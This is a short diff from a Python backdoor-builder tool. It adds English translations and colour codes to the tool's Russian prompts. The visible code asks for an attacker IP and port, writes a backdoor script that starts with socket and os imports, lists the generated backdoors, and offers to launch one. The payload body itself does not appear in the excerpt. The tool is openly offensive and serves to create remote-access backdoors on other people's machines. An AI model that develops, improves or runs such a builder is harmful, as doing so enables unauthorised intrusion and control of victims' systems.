@@ -409,8 +409,8 @@ my_backdoor.run() """)
 			print('pip3 install -r reqbak.txt')
 		def Backdoor1():
 			os.chdir('USER-BD')
-			ipu = input('\033[35mВведите свой IP')
-			ptu = input('\033[35mВведите порт')
+			ipu = input('\033[35mВведите свой IP(Enter IP):')
+			ptu = input('\033[35mВведите порт(Enter Port):')
 			e = str(input('\033[35mИмя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			b = open(e,"w",encoding='utf-8')
 			b.write("""import socket, os, time, threading, sys
@@ -799,10 +799,10 @@ P.s Given which OS and commands you need to enter	'''
 		print('Перейти назад?(Go back?){Если нет,то выход}{If not, then exit}\n Да/Нет | Yes/No')
 		otv1()
 	def Backdoor4():
-		print('Вот что найдено:(Here are the results):')
+		print('\033[32mВот что найдено(Here are the results):')
 		os.chdir('USER-BD')
 		os.system('ls')
-		print('Запустить бэкдор?Если нет то выход(Launch a backdoor?If not, then exit)\n Да/Нет | Yes/No')
+		print('\033[33mЗапустить бэкдор?Если нет то выход(Launch a backdoor?If not, then exit)\n Да/Нет | Yes/No')
 		otv4()
 	def Backdoor99():
 		os.system("python defwak.py")
